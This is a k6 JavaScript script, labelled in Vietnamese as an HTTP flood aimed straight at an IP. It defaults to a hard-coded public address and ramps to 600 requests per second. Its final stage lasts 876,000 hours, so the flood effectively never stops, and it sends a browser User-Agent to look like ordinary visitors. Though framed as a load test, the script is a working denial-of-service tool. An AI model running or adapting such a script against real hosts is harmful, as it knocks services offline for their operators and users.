import http from 'k6/http';
import { check, sleep } from 'k6';
import { Counter, Rate, Trend } from 'k6/metrics';

/* ==================================================================
   K6 LOAD TEST - HTTP flood thẳng vào IP
   Không login, không CSRF, không session.
   ================================================================== */

const TARGET_URL = (__ENV.TARGET_URL || 'http://103.211.206.175/').replace(/\/+$/, '') + '/';

const STAGES_RAW  = __ENV.STAGES         || '30s:100,60s:300,60s:600,876000h:600';
const START_RATE  = parseInt(__ENV.START_RATE  || '50',  10);
const PRE_VUS     = parseInt(__ENV.PRE_VUS     || '100', 10);
const MAX_VUS     = parseInt(__ENV.MAX_VUS     || '800', 10);

const TIMEOUT     = __ENV.REQUEST_TIMEOUT || '30s';
const DELAY       = parseFloat(__ENV.REQUEST_DELAY || '0');

const MAX_5XX_RATE     = parseFloat(__ENV.MAX_5XX_RATE     || '0.02');
const MAX_TIMEOUT_RATE = parseFloat(__ENV.MAX_TIMEOUT_RATE || '0.05');

// ===== Parse STAGES =====
const STAGES = STAGES_RAW.split(',')
  .map((p) => p.trim())
  .filter(Boolean)
  .map((p) => {
    const [duration, target] = p.split(':');
    if (!duration || !target) throw new Error(`STAGES không hợp lệ: "${p}"`);
    return { duration: duration.trim(), target: parseInt(target, 10) };
  });

// ===== Metrics =====
const reqOk      = new Counter('req_ok');
const req4xx     = new Counter('req_4xx');
const req5xx     = new Counter('req_5xx');
const reqTimeout = new Counter('req_timeout');

const okRate      = new Rate('req_ok_rate');
const err5xxRate  = new Rate('req_5xx_rate');
const timeoutRate = new Rate('req_timeout_rate');

const reqDuration = new Trend('req_duration');

// ===== Options =====
export const options = {
  discardResponseBodies: true,  // không đọc body, tiết kiệm CPU/RAM
  scenarios: {
    flood: {
      executor:        'ramping-arrival-rate',
      startRate:       START_RATE,
      timeUnit:        '1s',
      preAllocatedVUs: PRE_VUS,
      maxVUs:          MAX_VUS,
      stages:          STAGES,
    },
  },
  thresholds: {
    req_5xx_rate:     [`rate<${MAX_5XX_RATE}`],
    req_timeout_rate: [`rate<${MAX_TIMEOUT_RATE}`],
  },
};

// ===== Main =====
export default function () {
  const res = http.get(TARGET_URL, {
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
      'Accept':     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
      'Connection': 'keep-alive',
    },
    timeout: TIMEOUT,
    tags: { name: 'flood' },
  });

  const s = res.status;
  reqDuration.add(res.timings.duration);

  const ok      = s >= 200 && s < 400;
  const is4xx   = s >= 400 && s < 500;
  const is5xx   = s >= 500;
  const isTimeout = s === 0;

  okRate.add(ok);
  err5xxRate.add(is5xx);
  timeoutRate.add(isTimeout);

  if (ok)        reqOk.add(1);
  if (is4xx)     req4xx.add(1);
  if (is5xx)     req5xx.add(1);
  if (isTimeout) reqTimeout.add(1);

  check(res, {
    'không 5xx':    (r) => r.status < 500,
    'không timeout': (r) => r.status !== 0,
  });

  if (DELAY > 0) sleep(DELAY);
}
